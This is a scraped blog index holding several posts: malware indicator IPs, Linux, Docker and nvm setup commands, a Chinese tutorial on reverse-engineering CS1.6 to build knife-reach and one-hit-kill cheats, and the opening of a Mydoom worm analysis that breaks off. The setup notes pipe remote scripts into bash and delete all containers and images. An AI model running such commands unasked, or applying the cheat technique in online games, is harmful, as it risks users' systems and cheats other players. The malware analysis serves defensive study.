title=\"2、IP&#x2F;URL\"></a>2、IP&#x2F;URL</h2><ul>\n<li><p>5.253[.]84[.]159</p>\n</li>\n<li><p>5.253[.]84[.]159&#x2F;x</p>\n</li>\n<li><p>5.253[.]84[.]159&#x2F;pst.php</p>\n</li>\n</ul>\n","categories":["Virus"]},{"title":"Linux环境搭建常用命令","url":"/2024/04/21/Linux%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","content":"<h1 id=\"一、Nginx安装\"><a href=\"#一、Nginx安装\" class=\"headerlink\" title=\"一、Nginx安装\"></a>一、Nginx安装</h1><ol>\n<li><p>下载nginx</p>\n<ol>\n<li>官网：<a href=\"http://nginx.org/\">http://nginx.org/</a></li>\n<li>创建文件夹 <code>mkdir nginx &amp;&amp; cd nginx</code></li>\n<li>复制压缩包地址</li>\n<li><code>wget http://nginx.org/download/nginx-1.17.6.tar.gz</code>下载文件</li>\n<li>wget不存在 yum安装wget <code>yum -y install wget</code></li>\n</ol>\n</li>\n<li><p>安装必要插件</p>\n<ol>\n<li><code>yum -y install automake autoconf libtool make</code></li>\n<li><code>yum -y install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel</code></li>\n</ol>\n</li>\n<li><p>压缩下载好的文件</p>\n<ol>\n<li><code>tar -zxvf nginx-1.17.6.tar.gz</code></li>\n<li><code>cd nginx-1.17.6</code></li>\n<li>指定安装路径 <code>../images/Usual/configure --prefix=/software/nginx --with-http_stub_status_module --with-http_ssl_module</code></li>\n<li><code>make</code>编译</li>\n<li><code>make install</code>安装</li>\n<li>进入到安装nginx目录下面的sbin <code>cd /software/nginx/sbin</code></li>\n<li>启动命令 <code>../images/Usual/nginx</code></li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>常用命令</p>\n</blockquote>\n<ol>\n<li>从容停止服务器 <code>nginx -s quit</code> </li>\n<li>立即停止服务器 <code>nginx -s stop</code></li>\n<li>查询nginx主进程号 <code>ps -ef | grep nginx</code><ol>\n<li>从容停止 <code>kill -QUIT 主进程号</code></li>\n<li>快速停止 <code>kill -TERM 主进程号</code></li>\n<li>强制停止 <code>kill -9 nginx</code></li>\n</ol>\n</li>\n<li>启动 <code>../images/Usual/nginx</code></li>\n<li>重启 <code>../images/Usual/nginx -s reload</code></li>\n<li>停止 <code>../images/Usual/nginx -s stop</code></li>\n</ol>\n<h1 id=\"二、Nginx\"><a href=\"#二、Nginx\" class=\"headerlink\" title=\"二、Nginx\"></a>二、Nginx</h1><p>1.反向代理</p>\n<p>打开配置文件<code>/conf/nginx.conf</code></p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">listen</span> port [ssl];</span><br><span class=\"line\">\t<span class=\"attribute\">server_name</span> host;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#走https配置ssl证书</span></span><br><span class=\"line\">\t[<span class=\"attribute\">ssl_certificate</span> pem_path;]</span><br><span class=\"line\">\t[<span class=\"attribute\">ssl_certificate_key</span> key.path;]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"section\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">proxy_pass</span> 代理url;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>示例文件</p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl;</span><br><span class=\"line\">\t<span class=\"attribute\">server_name</span> xxxxx.cn;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"attribute\">ssl_certificate</span> .../images/Usual/pem/xxxxx.cn.pem;</span><br><span class=\"line\">\t<span class=\"attribute\">ssl_certificate_key</span> .../images/Usual/pem/xxxxx.cn.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"section\">location</span> / &#123;</span><br><span class=\"line\">        <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:3001;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2.上传限制</p>\n<p>Nginx默认最大能够上传1MB文件，大于1MB的文件自然无法上传，打开nginx.conf，在http{ }中设置：<code>client_max_body_size 大小</code></p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">client_max_body_size</span> <span class=\"number\">100m</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"三、常用docker指令\"><a href=\"#三、常用docker指令\" class=\"headerlink\" title=\"三、常用docker指令\"></a>三、常用docker指令</h1><p>1.安装docker</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>\n\n<p>2.Compose安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -L <span class=\"string\">&quot;https://github.com/docker/compose/releases/download/v2.2.2/docker-compose-<span class=\"subst\">$(uname -s)</span>-<span class=\"subst\">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"built_in\">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>\n\n<p>3.重启</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<p>4.端口映射</p>\n<ul>\n<li><p>运行时映射</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -p ip:hostPort:containerPort REPOSITORY:TAG</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>使用-d表示后台运行<br>使用-p参数会分配宿主机的端口映射到虚拟机。<br>IP表示主机的IP地址。<br>hostPort表示宿主机的端口。<br>containerPort表示虚拟机的端口。</p>\n<p>支持的格式有三种：<br>ip:hostPort:containerPort：映射指定地址的指定端口到虚拟机的指定端口（不常用）<br>如：127.0.0.1:3306:3306，映射本机的3306端口到虚拟机的3306端口。<br>ip::containerPort：映射指定地址的任意端口到虚拟机的指定端口。（不常用）<br>如：127.0.0.1::3306，映射本机的3306端口到虚拟机的3306端口。<br>hostPort:containerPort：映射本机的指定端口到虚拟机的指定端口。（常用）<br>如：3306:3306，映射本机的3306端口到虚拟机的3306端口。</p>\n</blockquote>\n</li>\n<li><p>docker-compose.yml设置</p>\n<p>在容器下方添加ports字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ports:</span><br><span class=\"line\">  - 27017:27017 #映射本机端口27017到docker的27017</span><br><span class=\"line\">  - 127.0.0.1:27017:27017 #映射</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>5.<a href=\"https://so.csdn.net/so/search?q=docker&spm=1001.2101.3001.7020\">docker</a>中 启动所有的容器命令</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker start $(docker ps -a | awk <span class=\"string\">&#x27;&#123; print $1&#125;&#x27;</span> | tail -n +<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n\n<p>6.docker中 停止所有的容器命令</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker stop $(docker ps -a | awk <span class=\"string\">&#x27;&#123; print $1&#125;&#x27;</span> | tail -n +<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n\n<p>7.docker中 删除所有的容器命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">rm</span> $(docker ps -a | awk <span class=\"string\">&#x27;&#123; print $1&#125;&#x27;</span> | <span class=\"built_in\">tail</span> -n +2)</span><br></pre></td></tr></table></figure>\n\n<p>8.docker中 删除所有的镜像</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker rmi $(docker images | awk <span class=\"string\">&#x27;&#123;print $3&#125;&#x27;</span> |tail -n +<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n\n<p>9.更新容器为开机自启</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker <span class=\"keyword\">update</span> <span class=\"comment\">--restart=always mysql #设置MySQL为开机自启</span></span><br></pre></td></tr></table></figure>\n\n<p>10.根据容器的状态，删除Exited状态的所有容器</p>\n<figure class=\"highlight crystal\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo docker rm <span class=\"variable\">$(</span>sudo docker ps -qf status=exited)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"四、安装nvm\"><a href=\"#四、安装nvm\" class=\"headerlink\" title=\"四、安装nvm\"></a>四、安装nvm</h1><p>github:<a href=\"https://github.com/nvm-sh/nvm\">nvm-sh&#x2F;nvm: Node Version Manager - POSIX-compliant bash script to manage multiple active node.js versions (github.com)</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh | bash</span><br></pre></td></tr></table></figure>\n\n<p>然后更新一下源</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc </span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>1.安装</p>\n<ul>\n<li><p>最新版</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nvm install node</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>指定版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nvm install 版本号 <span class=\"comment\"># nvm install 16</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n","categories":["Usual"]},{"title":"FPS全屏秒杀以及全屏飞刀漏洞的逆向分析","url":"/2024/04/21/FPS%E5%85%A8%E5%B1%8F%E7%A7%92%E6%9D%80%E4%BB%A5%E5%8F%8A%E5%85%A8%E5%B1%8F%E9%A3%9E%E5%88%80%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","content":"<h1 id=\"FPS全屏秒杀以及全屏飞刀漏洞的逆向分析\"><a href=\"#FPS全屏秒杀以及全屏飞刀漏洞的逆向分析\" class=\"headerlink\" title=\"FPS全屏秒杀以及全屏飞刀漏洞的逆向分析\"></a>FPS全屏秒杀以及全屏飞刀漏洞的逆向分析</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2019-11-19 20:45</li>\n</ul>\n<h1 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h1><p>一、引言</p>\n<p>二、正文</p>\n<p>1、全屏飞刀原理及实现</p>\n<p>2、全屏秒杀原理及实现</p>\n<p>三、总结</p>\n<p>四、白嫖</p>\n<p><strong>分析对象：CS1.6 5Eplay 版本</strong></p>\n<p><strong>编程工具：Visual Studio 2019</strong></p>\n<p><strong>工具：CheatEngine 6.7</strong></p>\n<h1 id=\"一、引言\"><a href=\"#一、引言\" class=\"headerlink\" title=\"一、引言\"></a>一、引言</h1><p>不知道有多少人是经历过穿越X线的神仙时代。我只记得当时最疯狂的是一个房间充满着各种奇葩的科学家，例如飞天、遁地、隐身、加速、子弹穿墙，飞刀等等，但是，最有意思的还是Bug不掉血的卡箱和卡墙。这些东西虽说是游戏的漏洞造成的，但是当时那个时候玩起来依旧是很开心，毕竟当时的游戏环境还是很认可的，武器属性的平衡，玩家之间的默契度，战队里的开黑，都让我们对当时的一些保留着一无比忘怀的怀念。</p>\n<p><img src=\"/../images/GameHacker/FPS%E5%85%A8%E5%B1%8F%E7%A7%92%E6%9D%80%E4%BB%A5%E5%8F%8A%E5%85%A8%E5%B1%8F%E9%A3%9E%E5%88%80%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/Untitled.png\" alt=\"Untitled\"></p>\n<p>![Untitled%201](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 1.png)</p>\n<p>![Untitled%202](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 2.png)</p>\n<p>![Untitled%203](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 3.png)</p>\n<h1 id=\"二、正文：\"><a href=\"#二、正文：\" class=\"headerlink\" title=\"二、正文：\"></a>二、正文：</h1><p>煽情完了，咱们开始正题。今儿咱们来说说远古时期的大发明-全屏飞刀和全屏秒杀。这篇文章依旧使用被无数次仙人跳的游戏来操作，嗯，没错就是CS1.6。</p>\n<p>![Untitled%204](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 4.png)</p>\n<p>在我们干事之前，稍微对游戏的一个动作进行思考，这里咱们先讲全屏飞刀，再讲全屏秒杀。</p>\n<p><strong>一、 全屏飞刀原理及实现</strong></p>\n<p>![Untitled%205](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 5.png)</p>\n<p>这里我总结了三种思路：1、通过游戏播放的音效来寻找。细心的同志可能会发现，挥刀的时候，打中和没打中是有两种音效播放的，所以我们只需要在游戏目录下找到这个音效的名字，然后去文件操作相关的api下断，看他什么时候去访问这个文件就行了，断下后直接返回应该就直接能找到关键代码处。2、只要是个有脑子的人，手里拿着枪的时候可以砰砰砰的射击，但是切刀之后就没法实现击中效果了。那么他肯定会有一个关键跳转来判断你当前武器是否是刀(有可能判断当前手持的模型ID)，这个时候找到这个跳转，搞就完事。3、都知道鼠标控制开火，那么鼠标消息肯定会经过关键代码，这个时候直接鼠标消息下断后去分析就行了，但是相比前两种方法，要分析的代码量更多，头发多的人推荐尝试。<br>这里我用的是第二种方法，但是其他方法依旧希望大家去试试，毕竟技多不压身(其实就是懒得去弄)。</p>\n<p>![Untitled%206](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 6.png)</p>\n<p>在正式去找的时候我们先来整理一下思路。首先我们要找的是全屏飞刀，那什么是全屏飞刀？顾名思义，就是当我们拿着刀的时候不用贴着敌人也能打中敌人。此时我们是不是很容易去联想到攻击call？因为你的刀能不能攻击到别人是取决于你的攻击call的代码流程，所以在内部代码中极有可能存在着某条跳转用来判断你这个攻击是否有效，如果有效，给你击中；如果无效，直接给你ret。下面是给出的伪代码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">bool</span> 开始攻击(xxxxxxxx)</span><br><span class=\"line\"> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"built_in\">If</span> ( 当前手持武器 == 刀)</span><br><span class=\"line\"> </span><br><span class=\"line\">       <span class=\"built_in\">If</span>(可以攻击==假)</span><br><span class=\"line\"> </span><br><span class=\"line\">Return <span class=\"literal\">false</span>； <span class=\"comment\">//攻击失败</span></span><br><span class=\"line\"> </span><br><span class=\"line\">              攻击（）；</span><br><span class=\"line\"> </span><br><span class=\"line\">              Return <span class=\"literal\">true</span>；</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>理论就说这么多，咱们直接找吧！</p>\n<p>![Untitled%207](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 7.png)</p>\n<p>首先咱们要找到游戏对人物处理血量的关键代码处，然后下断返回，就能看到攻击call了。很简单，<strong>找到血量-&gt;访问血量-&gt;射他-&gt;出现代码-&gt;记录代码-&gt;甩进OD-&gt;开始分析</strong>，其中前5步我就不演示了，直接放甩进OD的部分。</p>\n<p>![Untitled%208](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 8.png)</p>\n<p>![Untitled%209](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 9.png)</p>\n<p>给他下个F2断点，然后用刀划他**(记住，一定要用刀划，因为我们先在是要找基于刀的攻击代码)**。</p>\n<p>![Untitled%2010](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 10.png)</p>\n<p>这里我返回5层，因为我分析过，所以知道这5层内必有我们要找的东西，但是在实际分析其他游戏的时候，建议大家多返回。</p>\n<p>在开始分析这些call之前，我先和大家说两点非常关键的问题。</p>\n<p><strong>1）、我们从哪一层开始分析？</strong></p>\n<p>从最外层。为什么呢？很简单，因为越内层的call往往是对攻击处理，而不是对开始攻击逻辑的处理。实在不理解的话，咱们想一下咱们在写某个动作代码的时候，是不是先判断逻辑操作，再去执行核心代码？</p>\n<p><strong>2）、代码的执行逻辑</strong></p>\n<p>这个稍微有点难解释，因为他和第一个问题有小牵扯。如果我们对人物血量处理下断后返回层数不够多会怎么样？答案是，我们只得到了他攻击call处理代码。意思就是说当前得到的所有call是处理已经成功击打后的代码，而不是处理开始攻击逻辑的代码，导致在最外层下断的时候会出现一个问题，单纯挥刀不会断下，开枪才会断下**(因为你怎么开枪都会击中)**。解决的办法就是在人物血量处理地方下断后疯狂返回上一层并且记录，然后挨个下断挥刀，能断下说明找到了，断不下就再找。</p>\n<p>接下来依旧是我最喜欢的摊牌环节。</p>\n<p>![Untitled%2011](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 11.png)</p>\n<p>其实在这5层中，第5层就是处理开始攻击逻辑的call，其他的全是成功击打的call。因为只有在第5层call下断挥刀的时候才会断下，其他call下断挥刀不断。不信的同志可以去试试，接下来我们就来分析第5层call。<br>我们现在先下一个断。</p>\n<p>![Untitled%2012](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 12.png)</p>\n<p>然后我们对着墙或者人物划一刀**(可以击中的状态)**，发现断点断下了。</p>\n<p>![Untitled%2013](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 13.png)</p>\n<p>这个时候非常关键，我们F7进去后F8单步跟一下。 <strong>注意，记得标记跳转是否实现</strong></p>\n<p>在通过F8单步跟的时候，细心的人会发现一个东西。</p>\n<p>![Untitled%2014](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 14.png)</p>\n<p>![Untitled%2015](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 15.png)</p>\n<p>他这里会播放wav，实际上他这里就是在判断你的刀是否击打到物体，击打到了就播放击打音效，反之播放未击打音效。其实hit是击打音效，slash是未击打音效，笔者也是在分析的过程中看到这个才萌发处第一种思路。而且在单步跟踪的时候发现他跳过了播放slash音效，而去播放了hit音效并且执行了我们记录的第4层call**(攻击处理)**，说明上面有相关跳转控制了击打判断。</p>\n<p>现在我们返回第5层call，下断，对着空气挥刀看看。</p>\n<p>![Untitled%2016](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 16.png)</p>\n<p>同样F7进入后，F8单步跟，并且记录跳转是否实现。</p>\n<p>![Untitled%2017](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 17.png)</p>\n<p>这里观察到之前的实现的跳转现在没有实现了，说明这里可能是一个关键点<br>包括下面这张图的位置</p>\n<p>![Untitled%2018](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 18.png)</p>\n<p>最后会发现他去执行了这一串代码</p>\n<p>![Untitled%2019](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 19.png)</p>\n<p>这一串刚刚好是播放未击中音效的代码。再继续F8单步跟，发现他直接ret了，并没有去执行我们第4层的攻击代码。</p>\n<p>![Untitled%2020](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 20.png)</p>\n<p>经过以上分析，我们得出了两个关键点，那就是那两个jne跳转。在我们对墙壁或者人挥刀并且成功击打的时候该跳转是实现的，但是现在我们对着空气挥刀发现他跳转没有被实现，那么说明该跳转就是关键跳转，而且他们都是对同一个地址进行了读操作，所以游戏很有可能是对该地址的值进行一个校验，来判断是否能击打。</p>\n<p>![Untitled%2021](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 21.png)</p>\n<p>首先这个代码是一个很典型的浮点数比较代码，大概就是将0x19FEC660 和st(0)比较后把状态值传给ax，然后ah判断是否能击中物体。我们用CE看看这个地址的值。</p>\n<p>![Untitled%2022](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 22.png)</p>\n<p>发现是0，我们尝试改为1。回到游戏的时候，发现我们挥刀的时候竟然是击中的音效。此时全屏飞刀已经实现。</p>\n<p>![Untitled%2023](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 23.png)</p>\n<h3 id=\"一、-全屏秒杀原理及实现\"><a href=\"#一、-全屏秒杀原理及实现\" class=\"headerlink\" title=\"一、 全屏秒杀原理及实现\"></a>一、 全屏秒杀原理及实现</h3><p>虽然我们实现了全屏飞刀，但是会发现，当我们向敌人挥刀的时候，发现敌人并没有掉血，这个时候就会有人认为我在坑大家了。</p>\n<p>![Untitled%2024](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 24.png)</p>\n<p>其实呢，咱们还得需要一个东西，那就是选择攻击对象。这里呢，不知道大家还记得我在文章开头写的那个伪代码吗？我们当前只是修改了第一个if，但是还有第二个if**(可能还有更多if)**没有修改。我们虽然让他成功全屏攻击了，但是他可能会判断，你这个人和敌人是否在可攻击距离内，如果不在的话直接给你攻击一个空对象，具体的逻辑代码大家可以去分析一下。</p>\n<p>现在咱们来说说这个全屏秒杀，无论你拿着什么武器，你要射人，那你肯定要有一个攻击对象吧。于是咱们可以去跟一下，看看他的攻击对象的来源，然后用第三方手段去修改，这样我们想打谁就打谁了。攻击对象很好找，因为你攻击call的参数必定有攻击对象，然后就去追这个对象的来源。这里呢我就直接放追到的来源。</p>\n<p>![Untitled%2025](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 25.png)</p>\n<p>其实这里就是第4层call进来的内容，我在OD也注释了，他这里做了简单的判断，如果你的攻击对象为0那么就ret，否则就对攻击力进行一个赋值，然后进行攻击。在这里我们可以去观察我们全屏飞刀的时候，他的攻击对象一直为0，那就说明他没有选择一个攻击对象。我们换成枪，去打一下敌人，发现他的内容变了。我们直接锁定，然后换成刀去划，发现这个时候咱们的刀能打人了，而且对着哪里划都能打中，包括枪。咱们这时直接去修改攻击力，直接是一划既死。这个时候灵机一动。</p>\n<p>![Untitled%2026](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 26.png)</p>\n<p>是不是我们直接让程序不断的向这个地址写入对象，然后在修改攻击力就完事了？没错。就是这样。下面是效果展示</p>\n<p><img src=\"/../images/GameHacker/FPS%E5%85%A8%E5%B1%8F%E7%A7%92%E6%9D%80%E4%BB%A5%E5%8F%8A%E5%85%A8%E5%B1%8F%E9%A3%9E%E5%88%80%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/826671_M6NVDG6VMQGA2YZ.gif\" alt=\"826671_M6NVDG6VMQGA2YZ)\"></p>\n<p>其实这里还有一个处理方法，在0x1A0665F8下一个写入断点，能来到这个地方</p>\n<p>![Untitled%2027](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 27.png)</p>\n<p>其实这里是对攻击对象和攻击力进行一个0的初始化。处理方法很简单，直接在头部ret，不让他初始0，然后再用程序去写入会更稳定些，因为游戏会调用这个call，进行清0。<br>好了，基本上这就是全屏秒杀的分析。<br>另外 攻击对象的值&#x3D;对象]+0x7C]</p>\n<p>![Untitled%2028](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 28.png)</p>\n<h1 id=\"三、总结：\"><a href=\"#三、总结：\" class=\"headerlink\" title=\"三、总结：\"></a>三、总结：</h1><p>其实这个全屏飞刀的实现的思路是来源于我在很久之前就实现的植物大战僵尸的折叠种植功能，当时找的方法和本篇文章实现飞刀基本类似，就是用通过这种特殊的判断去分析的，在种植call下断后去实现一次普通的种植，然后跟进去记录跳转；然后再去种植call下断，直接去实现一次重叠种植，断下后F7进去单步直接可以发现关键跳转，然后直接改成jmp(好像是jmp)，直接就实现了折叠种植。昨天前段微风吹过脑壳，突发奇想来试试，果不其然，还真能实现！但是出现了无法攻击到对象的情况，然后偶然发现在飞刀的时候攻击call传进来的对象是0，于是就想到应该有一个地方有赋值对象的。然后努力了一波，就实现了全屏秒杀和全屏飞刀的效果。</p>\n<p>![Untitled%2029](..&#x2F;images&#x2F;GameHacker&#x2F;FPS全屏秒杀以及全屏飞刀漏洞的逆向分析&#x2F;Untitled 29.png)</p>\n<p>虽说这个是对cs1.6的漏洞分析，但是其他游戏的实现原理我觉得是差不多的，就拿飞刀来说，游戏肯定是需要去判断你这个武器是不是刀，是刀给你ret；反之给你攻击。所以这个地方基本上可以成为一个突破点。至于全屏秒杀，只要找到攻击对象的赋值也就差不多了。</p>\n","categories":["GameHacker"]},{"title":"Mydoom邮件传播蠕虫样本分析","url":"/2024/04/21/Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","content":"<h1 id=\"一、Readme模块分析\"><a href=\"#一、Readme模块分析\" class=\"headerlink\" title=\"一、Readme模块分析\"></a>一、Readme模块分析</h1><h2 id=\"1、样本标签\"><a href=\"#1、样本标签\" class=\"headerlink\" title=\"1、样本标签\"></a>1、样本标签</h2><table>\n<thead>\n<tr>\n<th>标签名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>Readme.exe</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>194B2F31CC40249C041A5581E6A12A5B</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>41.6 KB (42,624 字节)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>Win32 Exe</td>\n</tr>\n<tr>\n<td>时间戳</td>\n<td>1970-01-01 08:00:00</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>UPX</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>C&#x2F;C++</td>\n</tr>\n<tr>\n<td>SHA1</td>\n<td>D3D8BEE614F04572DA7EAA26D51C15EBB3C8D6C2</td>\n</tr>\n<tr>\n<td>CRC32</td>\n<td>BB433F23</td>\n</tr>\n</tbody></table>\n<h2 id=\"2、详细分析\"><a href=\"#2、详细分析\" class=\"headerlink\" title=\"2、详细分析\"></a>2、详细分析</h2><p>样本(194B2F31CC40249C041A5581E6A12A5B)首先检查是否处于调试环境和虚拟机环境。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108104256332.png\" alt=\"image-20221108104256332\"></p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108104413183.png\" alt=\"image-20221108104413183\"></p>\n<p>然后使用自写的字符串解密算法将字符串”fureinaf.qyy”解密为”shervans.dll”,并与路径%SYSTEM32%进行拼接后添加到注册表进行COM组件劫持，实现持久化。</p>\n<p><img src=\"/./Mydoom%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20221108104646144.png\" alt=\"image-20221108104646144\"></p>\n<p>其中样本的字符串解密算法如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">BYTE* __cdecl <span class=\"title function_\">sub_404AD6</span><span class=\"params\">(BYTE* a1, <span 